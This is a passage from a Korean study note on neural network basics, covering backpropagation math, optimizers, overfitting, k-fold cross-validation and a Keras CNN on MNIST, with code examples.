b_grad)\r# 계산된 w,b를 사용하여 x, y에 대해 정상적으로 예측값이 나오는지 확인\rdef acc(hypo, label):\r# 0.5 이상이면 0, 이하이면 1의 확률이 더 높으므로, 0.5를 기준으로 0 또는 1로 치환해 준다.\rpredicted = tf.cast(hypo \u0026gt; 0.5, dtype=tf.float32)\r# 정확도 = 계산값과 정답을 비교하여 맞으면 1점, 틀리면 0점으로 판단한 후 전체 점수를 평균 낸 값\raccuracy = tf.reduce_mean(tf.cast(tf.equal(predicted, label), dtype=tf.float32))\rreturn accuracy\r# 결과 계산\raccuracy = acc(predict(x_train), y_train).numpy() 퍼셉트론 퍼셉트론은 뉴럴 네트워크의 기본이 되는 개념으로, 인간의 신경망을 본따 프랑크 로젠블라트가 1957년에 고안한 알고리즘이다. 인간의 신경망은 외부 자극을 입력으로 받아 뉴런을 타고 신호가 전달된다. 뉴런과 뉴런 사이의 시냅스에서 신호를 전달하려면 역치값을 넘겨야 신호가 전달된다. 퍼셉트론은 입력을 받아 가중합(w1x1 + w2+x2 + \u0026hellip; + wixi+ b)을 취하고, 활성화 함수(sigmoid)를 거쳐 출력값을 생성한다. 다층 퍼셉트론 한 개의 퍼셉트론은 여러 문제를 해결할수 있다.\n좌표 평면에서 선 하나로 그룹을 구분지을 수 있는 경우에 해당한다. 대표적인 모델로는 AND모델, OR 모델이 있다. 하지만 단일 퍼셉트론으로 풀지 못하는 문제도 존재한다.\nXOR 모델이 대표적이다. 선 하나를 그어서 그룹을 분류할 수 없다. XOR 모델은 OR 퍼셉트론과 NAND 퍼셉트론을 1차적으로 수행하고, 두 수행에 대한 결과를 AND 연산하면 구할 수 있다. 이를 그래프로 표현하면 아래와 같다.\n0층 1층 2층\rx1 → s1 ↘ ↘ ↗ y\r↗ ↘ x2 → s2 ↗ 다중 퍼셉트론은 여러 layer를 두고 연산을 한다는 의미이며, layer가 증가하면 더 많이 분석된다는 뜻. 0층(가장 처음)은 input layer, 2층(가장 마지막)은 output layer, 그 사이의 layer는 hidden layer라 칭한다. hidden layer를 많이 만들면 대체로 데이터를 많이 분석하여 더 좋은 결과를 낼 수 있다고 할 수 있다. 오차 역전파 은닉층에 있는 각각의 w와 b를 구하는 방법이다.\n다층 퍼셉트론을 구성하면 각 layer마다 w와 b값이 구성되는데, 이때 오차를 구하기 위해 미분값을 구하는 것이 쉽지 않다.\n미분 안에 연결된 식이 많기 때문 layer의 개수는 변동될 수 있기 때문에 계산이 복잡하다 이 문제를 해결하기 위해 1980년도 오차 역전파 알고리즘이 발명된다. 이전에도 w와 b를 구할수는 있었지만, 구하는 방법에 대해 규칙성을 찾지는 못했다.\n오차 역전파 개요 최적화의 계산 방향이 output layer 에서 input layer 방향으로 진행된다. 이 떄문에 이 알고리즘을 back propagation 이라 부른다. 퍼셉트론에서 w와 b값을 찾기 위해 오차가 작아지는 방향으로(기울기가 0이 되는 방향으로) 업데이트 해 나갔는데, 다층 퍼셉트론에서는 다음 식으로 가중치를 변화시켜 나간다. W(t+1) = W * t - (∂오차) / (∂w): 새 가중치는 현 가중치에서 가중치에 대한 기울기를 뺀 값 출력층 오차 다층 퍼셉트론의 각 노드는 (1)입력값을 이용해 가중합을 만들고, (2) 가중합을 활성화 함수를 적용해 출력하는 두 단계를 수행한다. 3개 layer를 가지는 형태를 표현하면 아래와 같다. yh1, yh2 : hidden layer의 출력값 y_out1, y_out2 : output layer의 출력값, 예측값 0층 1층 2층\rx1 (w11)→ [가중합1 -\u0026gt; 활성화함수1] → yh1 (w31)→ [가중합3 -\u0026gt; 활성화함수3] → y_out1\r(w21)↘ ↗ (w41)↘ ↗\r(w12)↗ ↘ (w32)↗ ↘\rx2 (w22)→ [가중합2 -\u0026gt; 활성화함수2] → yh2 (w42) → [가중합4 -\u0026gt; 활성화함수4] → y_out2 오차 역전파는 y_out 값에서 반대로 진행하여 가중치 w를 업데이트 한다.\nw31(t+1) = w31 * t - (∂오차 y_out)/(∂w31) : 현재 weight에 미분값을 빼주면 다음 weight가 된다.\n오차 y_out 안에는 여러개의 출력값이 존재할 수 있다. (output layer의 node 개수만큼)\ny_out 안의 각각의 예측값에 대한 오차는 MSE를 이용해 구한다.\noutput layer의 node가 n개라고 하면, k번째 오차는 다음과 같다. 오차_y_out_k = (y_target_k - y_out_k)² / n 오차 역전파로, y_out1 값의 오차로 w31을 업데이트 해 보자.\n오차의 값은 ∂오차y_out / ∂w31 이다.\nchain rule에 의해 ∂오차y_out / ∂w31 = (∂오차y_out / ∂y_out1) * (∂y_out1 / ∂가중합3) * (∂가중합3 / ∂w31) 가 성립한다. 이 식의 우항을 각각 나누어 계산하여 보자. 2-1) (∂오차y_out / ∂y_out1)을 y_out1에 의해 편미분을 하면 y_out1과 관계없는 y_out2는 상수가 되어 사라진다. y_out = y_out1 + y_out2 = (y_target1 - y_out1)² / 2 + (y_target2 - y_out2)² / 2 이기때문에 최종 식은 (∂오차y_out / ∂y_out1) = 1/2 * ∂(y_target1 - y_out1)² / ∂y_out1 = y_out1 - y_target1 가 된다. 2-2) (∂y_out1 / ∂가중합3) 은 \u0026lsquo;활성화함수3\u0026rsquo;을 미분 해 주는것과 같다.\n우리는 활성함수로 시그모이드를 사용했고, 시그모이드의 미분은 ∂σ(x) / ∂x = σ(x) * (1 - σ(x)) 이다.\n따라서 ∂y_out1 / ∂가중합3 = y_out1 * (1 - y_out1) 이 된다. 2-3) 가중합3 = w31 * yh1 + w41 * yh2 + 1(bias) 형태인데, (∂가중합3 / ∂w31) 식에 첫 식을 대입하면 (∂가중합3 / ∂w31 = yh1 이 된다.\n(2)에서 구한 세 식을 합하면 (y_out1 - y_target1) * (y_out1 * (1 - y_out1)) * (yh1) 형태이다. 이때,\ny_out1 - y_target1 은 출력값, y_out1 * (1 - y_out1) 은 활성화함수의 미분 값이다. 이를 활용하여 델타 식으로 표현하면\nw31(t + 1) = w31 * t - δ * y * yh1 이 된다. (δ * y = (y_out1 - y_target1) * (y_out1 * (1 - y_out1)))\n은닉층 오차 위에서 w31을 구했고, 이제 w11을 구해보자\nw31은 y_out1에만 영향을 주고, y_out2에는 영향을 주지 않았다. 하지만 w11은 y_out1과 y_out2에 모두 영향을 주어서 식의 복잡도가 높다.\n점화식을 표현하면 w11(t+1) = w11 * t - (∂오차 y_out) / ∂w11 가 된다.\n(∂오차 y_out) / ∂w11 = (∂오차 y_out) / ∂yh1 * (∂yh1/∂가중합1) * (∂가중합1/∂w11) 형태로 chain rule을 사용할 수 있다. (∂yh1/∂가중합1) 은 activation 함수의 미분값이므로, (∂yh1/∂가중합1) = yh1(1 - yh1) 이 된다. 가중합을 w에 의해 미분하면 입력값이 된다. 따라서 (∂가중합1/∂w11) = x1 (∂오차 y_out) / ∂yh1 = ∂(오차y_out1 + 오차y_out2)/∂yh1 = ∂오차y_out1/∂yh1 + ∂오차y_out2/∂yh1\n5-1) 4 식을 나눠서 계산해보자. 먼저 ∂오차y_out1/∂yh1 = ∂오차y_out1 / ∂가중합3 * ∂가중합3 / ∂yh1' 5-1-1) 이때 ∂가중합3 / ∂yh1 = ∂(w31 * yh1 + w32 * yh2)/∂yh1 = w31 5-1-2)∂오차y_out1 / ∂가중합 = (∂오차y_out1 / ∂y_out1) * (∂y_out1 / ∂가중합3) = ( y_out1 - y_target1) * w31 * (1-y_out1) * y_out1 (∂오차y_out1 / ∂y_out1는 오차를 의미하고,∂y_out1 / ∂가중합3는 활성함수의 미분값을 의미하기 때문) 5-1-3) 최종적으로∂오차y_out1 / ∂yh1 = (y_out1 - y_target1) * w31 * (1 - y_out1) * y_out1 = δy_out1 * w31형태로 델타식을 만들 수 있다. 5-2) 다음∂오차y_out2/∂yh1도 5-1 에서 사용한 방식으로 계산하면 ∂오차y_out2/∂yh1 = δy_out2 * w41형태가 된다. 5-3) 위 값들로 4 에서 봤던 식을 구성하면 (∂오차 y_out) / ∂yh1 = δy_out1 * w31 + δy_out2 * w41` 이 된다. 2, 3, 5-3 에서 나온 값으로 1식을 재구성해보면 (∂오차 y_out) / ∂w11 = (δy_out1 * w31 + δy_out2 * w41) * yh1(1 - yh1) * x1 이다. 출력층의 오차 업데이트 : (y_out1 - y_target1) * y_out1 * (1 - y_out1) * yh1\n(y_out1 - y_target1) : 오차 은닉층의 오차 업데이트 : (y_out1 * w31 + y_out2 * w41) * yh1 * (1-yh1) * x1\n(y_out1 * w31 + y_out2 * w41) : hidden layer를 통해 출력값을 미분한 값 \u0026lsquo;출력층의 오차 업데이트\u0026rsquo;와 \u0026lsquo;은닉층의 오차 업데이트\u0026rsquo;는 공통적으로 y_out(1 - y_out) * x 의 형태(sigmoid function 미분 * 입력값)를 지니고 있다.\n은닉층의 가중치 업데이트를 델타식으로 표현하면 w11(t+1) = w11 * t - δh * x1 이다.\n델타식으로 표현하면 generic 한 형태로 식을 가져갈 수 있어 꼭 필요하다.\n그래디언트 소실(gradient vanishing) 다층 퍼셉트론을 사용할 때, 층이 많을 수록 데이터 분석 능력이 높아지지만, 실제로는 분석 증가량이 미미하다. 이는 활성화 함수 때문이다. 가중치를 수정할 때, 오차 값을 미분한 값을 사용하였다. 각 층의 activation function 으로 sigmoid를 사용했는데, sigmoid 함수는 미분시 최대치가 0.3 밖에 되지 않는다. 층을 지날수록 activation function을 여러번 거치는데, sigmoid의 미분값을 여러번 거치게 되면 미분값이 중간에 0이 되어버리는 현상(vanishing gradient) 문제가 발생한다. 층을 거쳐 갈수록 기울기가 사라져 가중치를 수정할 값이 소실되어 뒤쪽 layer는 더이상 학습이 되어지지 않는다. 그래디언트 소실 문제를 해결하기 위해 sigmoid를 대체할 다른 활성화함수들이 만들어 졌다. 하이퍼볼릭 탄젠트 : 미분 최대값 1, 소실문제를 약화시킬 순 있지만 해결되진 않는다. 렐루 : 0미만은 미분값 0, 0이상은 미분값 1. 많은 층을 사용할 때는 relu를 많이 사용한다. 소프트플러스 xavier와 he 초기화 초기 w와 b 할당시 표준편차가 1이고, 평균이 0인 정규분포를 사용하였다. 이렇게 되면 node를 통과한 결과값이 0과 1에 치중되어 있는 형태를 볼 수 있다. 표준편차를 0.01을 주면 결과값이 0.5로 치중되게 된다. 이렇게 되면 layer를 몇개를 쓰던 layer가 하나인 경우와 동일한 효과가 나온다. 이를 표현력의 제한이라 한다. 이러한 문제점을 xavier 방법을 사용하면 해결할수 있다. 가중치 초기화를 설정하는 방법으로, 결과값의 분포를 더 광범위하게 설정할 수 있게 하는 방법이다. √(2/n_in + n_out) 형태로 최초 사용하는 분포를 만들게 되면 더 광범위한 형태로 만들 수 있다. (n_in : layer의 입력node 개수, n_out : layer의 출력node 개수) 우리는 입력,출력 값이 같은 hidden layer를 사용하므로 √(1/n) 형태를 가진다. 단, xavier 방식은 좌우 대칭인 activation function 에서는 효과적이지만, relu와 같은 좌우 비대칭 형태의 activation function에서는 한쪽으로 치우친 결과값이 얻어진다. 이때는 \u0026lsquo;카밍 히\u0026rsquo;의 이름을 따서 he 초기값을 사용한다. √2/n 의 정규분포 값을 사용한다. (분포 범위를 더 넓게 잡는다) 고속 옵티마이저 옵티마이저란 경사하강법을 뜻한다. 고속 옵티마이저란 경사 하강법을 더 효율적으로 하는 방법이다. 경사 하강법은 대체로 학습 속도와 정확도 문제를 갖고 있다. (learning rate 혹은 data에 의해 발생) 경사 하강법은 업데이트 시마다 전체 데이터에 대해 미분을 계산하여야 하여 속도가 매우 느리다. 학습률이 너무 크면 더이상 최적값으로 수렴하지 못하는 경우가 있다. 경사 하강법은 구현하기 쉽고 단순하다는 장점이 이 있지만, 비등방성 함수에서는 탐색 경로가 비효율적이다. (ex: f(x,y) = 1/20x^2 + y^2 와 같은 타원형 형태) y축은 가파르지만, x축 변동은 거의 없다. 최적값은 (0,0) 이지만 미분으로 기울기 값을 구하면 (0,0) 이 아닌 다른 방향을 가리킬 확률이 매우 높다. 정상적으로 도달하더라도 지그재그 형태로 비효율적인 방식으로 이동하게 된다. 경사 하강법은 무작정 기울어진 방향으로 진행하기 때문에 간단하지만 위와같은 문제점을 야기한다. 경사 하강법의 문제점을 개선해 주는 모델들로는 \u0026lsquo;모멘텀\u0026rsquo;, \u0026lsquo;adagrad\u0026rsquo;, \u0026lsquo;adam\u0026rsquo; 등이 있다. 모멘텀 모멘텀 알고리즘은 물리 현상의 운동량에 착안하여 만들어 졌다. 이전 회차의 미분값 중 일정 비율을 반영하여 현재 weight 값 설정에 영향을 주도록 하여 더 빠르게 최적점을 찾을 수 있도록 하는 방식이다. 기존에는 현재 미분값 * 학습률을 현재 w에 빼주었지만, 모멘텀에서는 (일정 비율) * (이전 미분값) - (학습률) * (현재 미분값) 을 현재 w에 더해준다. 이 값은 V(t) = γ*v(t-1) - η*∂오차/∂w(t) 로 표현한다. 즉, W(t+1) = W(t) + V(t) 와 같은 식이 된다. 이전의 미분값을 일부 적용함으로써 현재 미분값을 상충하는 효과를 얻을 수 있다. 이를 통해 학습 속도를 높일 수 있다. 네스테로프 모멘텀 네스테로프 모멘텀에서는 w를 업데이트 할 때 γ*v(t-1) - η*∂오차/∂w(t) 값 대신 γ*v(t-1) - η*∂오차/∂(w(t) + γ*v(t-1)) 를 사용한다. 모멘텀 방법으로 이동될 방향을 미리 예측하여 해당 방향으로 한단계 미리 이동한 그래디언트 값을 사용함으로써 불필요한 이동을 줄일 수 있다. 속도는 그대로이지만 단계를 절약할 수 있다. 아다그리드 학습률을 조절하여 효율을 높인 모멘텀이다. 아다그라드는 weight값이 업데이트 될 때 마다 점점 최적점을 찾아간다고 가정하고, 학습을 시킬때 마다 일정량의 learning rate를 떨어뜨린다. 학습률을 변화시키기 위해 G(t)값을 G(t) = G(t-1) + [∂오차/∂w(t)]^2 형태로 가져가며, 최종적으로 W(t+1) = W(t) + η * (1/√G(t) + ε) * ∂오차/∂w(t) 형태가 된다. (ε 는 0이 되는것을 방지하기 위해 더해주는 아주 작은 상수값) RMSprop 아다그라드에서 G(t)는 무한히 커지게 되는 문제점이 있다. 이를 해결하기 위해 G(t) = γ * G(t-1) + (1-γ) * [∂오차/∂w(t)]^2 형태를 취한다. \u0026lsquo;γ\u0026rsquo; 값을 이용해 G(t) 값을 조절할 수 있도록 하였다. Adam RMSprop의 정확도, 모멘텀 방식의 속도 장점을 모두 취하는 방식이다.\nRMSprop의 G(t) 값과 모멘텀의 V(t) 값을 유사하게 구하여 사용한다.\nV(t) = γ_1 * G(t) + (1 - γ_1) * ∂오차/∂w(t) G(t) = γ_2 * G(t) + (1 - γ_2) * [∂오차/∂w(t)]^2 V(t)와 G(t) 값을 조절하여 V\u0026rsquo;(t), G\u0026rsquo;(t) 를 만들어 W(t+1) 을 구한다.\nV'(t) = V(t) / (1-r_1^t) G'(t) = G(t) / (1-r_2^t) W(t+1) = W(t) - η * (G'(t) / √(V'(t) + ε)) 이때까지 내용을 모두 분석해 보면 전반적으로 adam 옵티마이저가 좋은 성능을 내기는 한다.\n하지만 항상 adam이 최적의 효율을 내지는 않는다. 이는 데이터 형태가 다르기 때문이다.\n데이터 형태에 따라 취해지는 패턴과 오차 그래프의 모양이 다르기 때문이다.\ngradient descent, momentum, adagrid, adam, RMSprop 중 어느것이 효과가 좋은지 확인이 필요하다.\n다중 분류 입력값을 기준으로 단순 0 또는 1을 판단하는게 아니라, 여러 class 중 하나로 분류하는 모델을 알아보자 출력 node 개수를 분류되는 항목 개수로 설정한다. 활성화 함수를 적용하려면 Y값이 0과 1로 이루어져 있어야 한다. (100% 혹은 0%) 출력 node가 하나라면 Y값은 0 또는 1이면 되지만, 2개 이상이라면 배열이 되어야 한다. 1 =\u0026gt; [1,0,0], 2 =\u0026gt; [0,1,0], 3 =\u0026gt; [0,0,1] 형태로 변형해서 사용해야 한다. 이렇게 Y값을 0 또는 1로만 이루어진 형태로 바꾸어주는 기법을 one-hot-encoding 이라 한다. 텐서플로에서 one_hot() 함수를 지원한다. softMax classification 문제를 풀 때 점수 벡터를 클래스 별 확률로 변환하기 위해 사용하는 함수이다. 각 점수 벡터에 지수를 취한 후 정규화 상수로 나누어 총합이 1이 되도록 계산한다. exponential을 취하는 이유는 값이 클 수록 훨씬 더 높은 점수를 갖게 하기 위함이다. y_k = exp(a_k) / ∑\u0026lt;i=1,n\u0026gt; exp(a_i) softMax는 exponential을 사용하기 때문에 큰 값의 나눗셈을 수행해야 하여 overflow가 발생하기 쉽다. 수식을 개선하여 다음과 같이 사용한다. (keras에서도 개선된 수식을 사용함) y_k = exp(a_k) / ∑\u0026lt;i=1,n\u0026gt; exp(a_i)\r= C * exp(a_k) / C * ∑\u0026lt;i=1,n\u0026gt; exp(a_i)\r= exp(a_k + log C) / ∑\u0026lt;i=1,n\u0026gt; exp(a_i + log C)\r= exp(a_k + C\u0026#39;) / ∑\u0026lt;i=1,n\u0026gt; exp(a_i + C\u0026#39;) Cross Entropy softmax 에서 사용하는 오차방정식 cross entrpoy는 서로 다른 두 값의 확률 차이를 나타낼 수 있다. E = - ∑\u0026lt;k\u0026gt; t_k * log y_k 형태를 가진다. ex) 정답이 [0, 1] 이고, 결과가 [1, 0] 인 경우, E = 0 * log1 + 1 * log0 = ∞ ex) 정답이 [0, 1] 이고, 결과가 [0, 1] 인 경우, E = 1 * log1 + 0 * log0 = 0 오버피팅 훈련 데이터에 지나치게 적응하여 훈련 그 외의 데이터에 대해서는 제대로 평가를 하지 못하는 경우를 일컫는다. 학습 데이터를 통해 경향성만 추출해 내는 것이 가장 바람직한 학습 목표이다. 오버피팅은 모든 데이터를 모으지 못하면 발생할 수 있다. (훈련 데이터가 적을 때) 한쪽으로 편향된 데이터를 학습에 사용하거나, 노이즈를 일으키는 데이터를 사용한 경우에 발생할 수 있다. 은닉층이 너무 많거나 각 층의 노드 수가 많아 변수가 복잡해지면 발생할 수 있다. 테스트 셋과 학습 셋이 중복될 때 생기기도 한다. 데이터 처리 방법 오버피팅을 줄이기 위해서 데이터를 조작하는 방법을 사용할 수 있다. 학습 데이터셋과 테스트 데이터셋을 구분해서 사용한다. 학습 : 테스트 를 7:3 또는 8:2 정도로 사용하는 것이 일반적이다. 학습 데이터를 \u0026lsquo;학습\u0026rsquo; 데이터와 \u0026lsquo;검증\u0026rsquo; 데이터로 나눈다. 학습 데이터를 이용하여 모델을 학습시킨다. 학습을 시키면서 중간중간 검증 데이터를 이용하여 학습된 모델을 검증한다. 데이터를 학습시킬수록 \u0026lsquo;학습\u0026rsquo; 데이터에 대한 오차는 점점 줄어들지만, \u0026lsquo;검증\u0026rsquo; 데이터에 대한 오차는 일정 구간이 되면 증가하게 된다. \u0026lsquo;검증\u0026rsquo; 데이터 오차가 증가하는 시점이 over-fitting이 시작되는 구간이므로 학습을 중단한다. \u0026lsquo;검증\u0026rsquo; 데이터는 학습에 사용되지 않고, 검증에만 사용됨에 주의한다. Dropout 규제 방법 제프리 힌튼이 2012년에 제안한 방법 매 훈련 step에서 일정 node를 훈련에서 무시하는 방법이다. ex) node = {n1, n2, n3, n4} 가 있다면, step 1에서는 n1, n2만 있는 것 처럼 동작하고, step 2에서는 n3, n4만 있는 것 처럼 동작하고 \u0026hellip; 데이터를 증식한다. 관련 데이터를 모두 수집하는것이 최선이지만, 현실적으로 불가능하다. 대신 데이터를 증식하는 방법을 사용한다. 데이터 증식이란, 실제와 같은 훈련 데이터를 생성한다. 데이터 증식은 인공적으로 만든 샘플과 실제 데이터를 구분할 수 없어야 한다. 백색소음(white noise)를 추가하는 것은 도움이 되지 않는다. 의미있는 학습 데이터가 필요하다. 데이터 증식은 이미지 데이터를 처리할 때 매우 유용하다. 이미지는 확대, 축소, 이동, 회전, 반전 등을 통해 하나의 이미지로 여러 데이터를 만들 수 있다. K겹 교차 검증의 이해 데이터 셋을 학습용과 테스트용으로 나누었을 경우, 테스트에 사용되는 데이터는 극히 일부밖에 되지 않는다 데이터 셋을 k등분 하여, 테스트 셋과 학습 셋을 돌려가며 사용하는 방법을 k겹 교차검증이라 한다. 전체 데이터를 5개로 나누었다 가정하고, 나눈 데이터의 덩어리를 각각 d1, d2, d3, d4, d5라 하자 이때 d1을 테스트 데이터로 사용, 나머지를 훈련 데이터로 사용한 경우 결과를 R1이라 하자 d2를 테스트 데이터로 사용, 나머지를 훈련 데이터를 사용한 경우 결과를 R2라 하자 d3, d4, d5도 마찬가지로 하여 R3, R4, R5를 도출해 낸다. R1~R5를 모두 합치면 최종 결과가 나온다. 데이터를 5등분 했으므로, 위 방법은 5겹 교차검증이 된다. from tensorflow.keras.models import Sequential\rfrom tensorflow.keras.layers import Dense\rfrom sklearn.preprocessing import LabelEncoder\rfrom sklearn.model_selection import StratifiedKFold\rimport numpy\rimport pandas as pd\rimport tensorflow as tf\rnumpy.random.seed(777)\rtf.random.set_seed(777)\rdf = pd.read_csv(\u0026#39;sonar.csv\u0026#39;, header=None)\rdataset = df.values\rx_data = dataset[:,0:60].astype(float)\ry_data = dataset[:,60]\r# y_data를 one-hot 으로 처리해 준다.\re = LabelEncoder()\re.fit(y_data)\ry_data = e.transform(y_data)\r# k-fold 알고리즘을 사용할 객체를 형성한다.\r# n_splits : 10등분하여 사용할 것이다.\r# shuffle : 섞어서 사용할 수 있도록 허용\r# random_state : shuffle 사용시 사용할 랜덤한 seed 값\rn_fold = 10\rskf = StratifiedKFold(n_splits=n_fold, shuffle=True, random_state=48)\raccuracy = []\r# skf.split() 함수를 통해 x_data와 y_data를 k-fold 알고리즘에 맞게 분해하여 반환한다.\r# for문을 통해 데이터를 반복하여 학습을 수행한다.\rfor train, test in skf.split(x_data, y_data):\r# 모델을 구성한다.\r# 활성함수로 sigmoid, 오차함수로 binary-crossentropy를 사용할 것이다.\rmodel = Sequential()\rmodel.add(Dense(30, input_dim=60, activation=\u0026#39;relu\u0026#39;))\rmodel.add(Dense(10, activation=\u0026#39;relu\u0026#39;))\rmodel.add(Dense(1, activation=\u0026#39;sigmoid\u0026#39;))\rmodel.compile(loss=\u0026#39;binary_crossentropy\u0026#39;,\roptimizer=\u0026#39;adam\u0026#39;,\rmetrics=[\u0026#39;accuracy\u0026#39;])\rmodel.fit(x_data[train], y_data[train], epochs=100, batch_size=5)\rk_accuracy = \u0026#34;%.3f\u0026#34; % (model.evaluate(x_data[test], y_data[test])[1])\raccuracy.append(k_accuracy)\rprint(\u0026#34;\\n %.f fold accuracy:\u0026#34; % n_fold, accuracy)\r# 결과값은 데이터에 따라 달라질 수 있다. 학습에 사용된 데이터가 편향되어 있는 경우 평가 결과가 떨어지는 모습을 볼 수 있다.\r# k-fold 알고리즘을 사용하면 이러한 경우를 예방할 수 있다. 이미지 데이터 모델링 MNIST 는 대표적인 이미지 모델링 데이터로, 70,000개의 글자 이미지에 각각 0부터 9까지 정답이 포함되어있는 데이터 셋이다.\ntrain data 6만개, test data 1만개로 나누어져 있다. 이미지 크기는 28 by 28 크기로 구성되어 있고, 각 픽셀은 0~255 사이의 밝기 값을 가진다. 이미지 데이터를 학습할 때는 전처리가 필요하다. MNIST를 예로 들어 알아보자.\n이미지 데이터는 2차원 데이터이다. 이를 1차원 데이터로 직렬화 하여야 학습이 가능하다. reshape() 함수를 이용하여 784개의 속성을 가진 1차원 배열로 바꿔준다. 0~255 값은 데이터 폭이 큰 편이다. 데이터 폭이 크면 분산이 커지므로 이를 줄여주는것이 좋다. normalization 을 하거나, scaling을 해 준다. max 값이 정해져 있으면 단순히 값을 max로 나눠주면 0~1 구간으로 scaling이 된다. max 값이 미정인 경우는 min-max scaler를 사용할 수 있다. (요소값 - 최소값) / (최대값 - 최소값) 결과 값이 0~9의 class로 나뉘기 때문에 one-hot encoding을 통해 y 값을 전처리 해준다. CNN 연속하는 layer 상의 모든 node들이 서로 연결되어있는 형태를 \u0026lsquo;fully connected layer\u0026rsquo;(FC layer) 라고 한다. 한 장의 컬러 사진은 3차원 데이터이다. 이를 FC 신경망을 이용하여 학습할 시 제약이 많다. 이러한 다차원 데이터 학습을 손실 없이 사용할 수 있도록 만든 모델이 Neural Network이다. 그 중 Convolution Neural Network를 사용하면 이미지의 공간 정보를 유지한 채로 학습이 가능하다. CNN 과 FCNN 비교 Fully Connected Neural Network는 2차원 그림을 1차원으로 재구성하여 학습시켰다. CNN은 2차원 배열을 특정 그룹(Kernal, filter)으로 나누어 특징을 추출하는 형태로 학습시키기 때문에 입출력 데이터에 대한 형상 유지가 가능하다. 이미지 공간 정보를 유지하기 때문에 인접 이미지에 대한 특징을 효과적으로 인식할 수 있다. 여러개의 filter(kernal)을 사용함으로써 다양한 특징을 추출하여 학습할 수 있다. filter를 공유 파라미터로 사용하기 때문에 FCNN 보다 학습 파라미터가 적다. CNN 이론 CNN 은 이미지의 특징을 추춣해 내는 부분과, 클래스를 분류하는 부분으로 구성된다. CNN을 통해 특성별로 분류를 하면, fully connected neural network로 값을 전달하여 원하는 class 를 판단하도록 한다. 필터, 커널, 윈도우 라고 부르는 m by n lalyer를 정의한다. 필터는 원본 데이터보다 크기가 작아야 한다. 필터도 각 픽셀마다 값을 갖고 있다. 전체 이미지 위에 필터를 겹쳐놓았을 때, 필터와 원본 이미지가 맞닿는 부분을 서로 곱한 다음, 모든 결과물을 합한다. 필터를 한 픽셀씩 움직여 가며, 위 계산을 반복하고, 그 결과물을 m by n 형태로 정렬하면, convolved layer 결과물을 얻을 수 있다. 채널 한 이미지에 대해 여러 겹으로 쌓여져 있는 형태를 채널이라 한다. 컬러를 표현하기 위해서는 R,G,B 세 색깔의 채널을 합하면 된다. 색상이 많을수록 채널은 많아진다. 필터 일반적으로 (3,3), (4,4) 와 같은 정사각형 행렬로 정의된다. CNN에서 학습의 대상은 필터 파라미터이다. (필터 안의 픽셀 값) 필터를 사용해 원본 데이터를 순회하며 채널별로 합성곱을 구하고, 모든 채널의 합성곱을 다시 합해 Feature Map으로 만든다. 입력 데이터가 여러 채널을 가지는 경우, 필터도 채널의 갯수에 맞게 가져야 한다. 각 채널별로 필터를 적용하여 feature map을 구하고, 최종적으로 모든 채널의 feature map을 합산하여 최종 feature map을 도출한다. 스트라이드 (stride) 필터를 순회하는 간격을 stride라 한다. stride는 (1,1) 과 같은 형태로 표현한다. (가로로 1칸씩 이동, 세로로 1칸씩 이동) stride와 필터의 크기로 feature map 크기가 결정된다. padding 원본 데이터의 테두리에 0으로 채운 dummy pixel을 넣어줌으로써 feature map의 크기와 원본의 크기가 같아지도록 하는 것 pooling 필터를 사용해 얻어낸 convolution layer의 모든 값을 더하는게 아닌, 특정 데이터만 뽑아서 feature map을 구성하는 방법이다. 출력 데이터의 크기를 줄이거나 데이터를 강조하는 용도로 사용한다. 방법에 따라 max pooling, average pooling, min pooling 등이 있다. from tensorflow.keras.datasets import mnist\rfrom tensorflow.keras.utils import to_categorical\rfrom tensorflow.keras.models import Sequential\rfrom tensorflow.keras.layers import Dense, Dropout, Flatten, Conv2D, MaxPooling2D\rimport matplotlib.pyplot as plt\rimport numpy as np\rimport tensorflow as tf\rnp.random.seed(3)\rtf.random.set_seed(3)\r(x_train, y_train), (x_test, y_test) = mnist.load_data()\r# 4차원형태 데이터 구성\r# [batch, x size, y size, channel]\rx_train = x_train.reshape(x_train.shape[0], 28, 28, 1).astype(\u0026#39;float32\u0026#39;)/255\rx_test = x_test.reshape(x_test.shape[0], 28, 28, 1).astype(\u0026#39;float32\u0026#39;)/255\ry_train = to_categorical(y_train)\ry_test = to_categorical(y_test)\rmodel = Sequential()\r# CNN 모델 구성\r# 커널을 32개, 크기는 3 by 3\r# 입력층, 28 by 28 크기에 1채널 사용, relu 사용\r# stride 는 설정 하지 않으면 (1,1) 이 기본\r# padding은 설정하지 않으면 없음.\r# padding이 없고 stride가 (1,1) 이기 때문에 결과값은 (26,26) 크기가 될 것\rmodel.add(Conv2D(32, kernel_size=(3, 3), input_shape=(28, 28, 1), activation=\u0026#39;relu\u0026#39;))\r# 커널 62개, 3 by 3\r# relu 사용\rmodel.add(Conv2D(64, (3,3), activation=\u0026#39;relu\u0026#39;))\r# pooling 사용\r# max pooling 방법, pool_size = 2 이므로, stride는 자동으로 (2,2) 가 된다. (pooling은 중복되게 필터를 설정하지 않음)\r# 결과값은 절반의 크기(12,12) 가 될 것\rmodel.add(MaxPooling2D(pool_size=2))\r# dropout layer\rmodel.add(Dropout(0.25))\r# FCNN 모델 구성, 결과값으로 classification\r# 입력값이 (12,12,64) 이다. 이를 직렬화(1차원 배열화) 시켜 준다.\rmodel.add(Flatten())\r# 128 node를 가진 hidden layer\rmodel.add(Dense(128, activation=\u0026#39;relu\u0026#39;))\r# FC에서 over-fitting이 두드러지기 때문에 더 높은 값으로 dropout을 설정하였다.\rmodel.add(Dropout(0.5))\r# MNIST는 10개중 하나를 선택하므로, 출력 layer의 node는 10개로 설정, softmax 사용\rmodel.add(Dense(10, activation=\u0026#39;softmax\u0026#39;))\r# 모델 구조 확인\rmodel.summary()\r# 모델 학습 및 평가\rmodel.compile(loss=\u0026#39;categorical_crossentropy\u0026#39;,\roptimizer=\u0026#39;adam\u0026#39;,\rmetrics=[\u0026#39;accuracy\u0026#39;])\rresult = model.fit(x_train, y_train,\rvalidation_data=(x_test, y_test), # split 대신 직접 평가용 데이터를 지정하는 방법\repochs=30,\rbatch_size=200)\rprint(\u0026#39;loss \u0026amp; accuracy:\u0026#39;,model.evaluate(x_test, y_test))\ry_vloss = result.history[\u0026#39;val_loss\u0026#39;]\ry_loss = result.history[\u0026#39;loss\u0026#39;]\rx_len = np.arange((len(y_loss)))\rplt.plot(x_len, y_vloss, \u0026#39;.\u0026#39;, c=\u0026#39;red\u0026#39;, label=\u0026#39;validation loss\u0026#39;)\rplt.plot(x_len, y_loss, \u0026#39;.\u0026#39;, c=\u0026#39;blue\u0026#39;, label=\u0026#39;train 